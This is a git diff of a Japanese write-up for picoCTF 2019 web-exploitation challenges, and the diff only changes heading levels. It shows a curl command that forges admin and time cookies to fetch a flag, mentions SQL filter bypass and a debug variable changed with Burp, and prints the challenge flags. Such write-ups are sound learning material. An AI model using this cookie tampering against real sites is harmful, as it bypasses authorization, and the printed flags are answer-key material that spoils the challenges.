@@ -38,15 +38,15 @@ Web Exploitation の Writeupです。
 
 
 <br /><br />
-# [Web Exploitation]: Open-to-admins (200 points)
+## [Web Exploitation]: Open-to-admins (200 points)
 - - -
-## Challenge
+### Challenge
 > This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. https://2019shell1.picoctf.com/problem/32249/ (link) or http://2019shell1.picoctf.com:32249
 <br /><br />
 Hints : Can cookies help you to get the flag?<br />
 
 <br />
-## Solution
+### Solution
 ```
 curl -k -H 'Cookie: admin=True; time=1400'  https://2019shell1.picoctf.com/problem/32249/flag
 ```
@@ -58,15 +58,15 @@ Flag: `picoCTF{0p3n_t0_adm1n5_cc661e91}`
 
 <br /><br />
 <br /><br />
-# [Web Exploitation]: Irish-Name-Repo 2 (350 points)
+## [Web Exploitation]: Irish-Name-Repo 2 (350 points)
 - - -
-## Challenge
+### Challenge
 > There is a website running at https://2019shell1.picoctf.com/problem/60775/ (link). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://2019shell1.picoctf.com:60775
 <br /><br />
 Hints : The password is being filtered.
 
 <br />
-## Solution
+### Solution
 picoCTF 2018のVaultと同じ問題です。
 
 デバッグを見ようとして、以下を入れたら、Flag取れちゃった。
@@ -85,16 +85,16 @@ Flag: `picoCTF{m0R3_SQL_plz_015815e2}`
 
 <br /><br />
 <br /><br />
-# [Web Exploitation]: Irish-Name-Repo 3 (400 points)
+## [Web Exploitation]: Irish-Name-Repo 3 (400 points)
 - - -
-## Challenge
+### Challenge
 > There is a secure website running at https://2019shell1.picoctf.com/problem/12271/ (link) or http://2019shell1.picoctf.com:12271. Try to see if you can login as admin!
 <br /><br />
 Hints : Seems like the password is encrypted.
 
 
 <br />
-## Solution
+### Solution
 Burpでやったらdebug変数が見えたので、1に変えてみました。
 
 ```
